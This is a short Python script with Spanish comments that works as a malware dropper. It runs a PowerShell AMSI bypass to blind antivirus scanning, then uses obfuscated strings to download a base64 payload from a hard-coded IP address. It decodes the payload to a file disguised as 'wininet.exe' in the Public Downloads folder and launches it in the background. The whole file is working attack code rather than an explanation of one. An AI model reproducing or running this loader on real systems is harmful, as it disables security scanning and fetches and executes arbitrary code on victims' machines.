from creador_procesos import *
from command_executor import *
import time

# Amsi Bypassing

run_command_get_output("[Ref].Assembly.GetType('System.Management.Automation.Amsi'+'Utils').GetField('amsiInit'+'Failed','NonPublic,Static').SetValue($null,!$false)")

# Ofuscacion chafa xD
papapapapapapapth=r'''c:\U"s"eR"s\PUBl"Ic"/.\dOw"n"L"OaD"S/Te"MP\.././"KKk"KK"k"K"kKKKk"kkKkK.b64'''
x00023="iNvoke-WEbrEQuEsT"
xdddddd="-urI"
x023231='''ht"t"p://192.168.106.136:8"0"0"0/kk"kk"kk"k"k"k"kkkkkkk"k.b6"4'''
oyara=fr'''-"ou"t"f"ILe {papapapapapapapth}"'''
run_command_get_output(fr'''{x00023} {xdddddd} {x023231} {oyara}''')

# Ofuscacion chafa xD
huesitos={
    '$strinn64 = ': r"Get-Content 'C:\Users\Public\Downloads\KKkKKkKkKKKkkkKkK.b64' -Raw;",
    '$bytes=': '[System.Convert]::FromBase64String($strinn64);',
    '$decoded_file=':r"'C:\Users\Public\Downloads\wininet.exe';",
    '[System.IO.File]::':'WriteAllBytes($decoded_file, $bytes);'
}
com=""
for x,d in huesitos.items():
    cadena=f"{x}{d}"
    com+=cadena
run_command_get_output(com)

locate = r'"C:\Users\Public\Downloads\wininet.exe'

# Ejecucion del binario anterior 
create_background_process(locate)

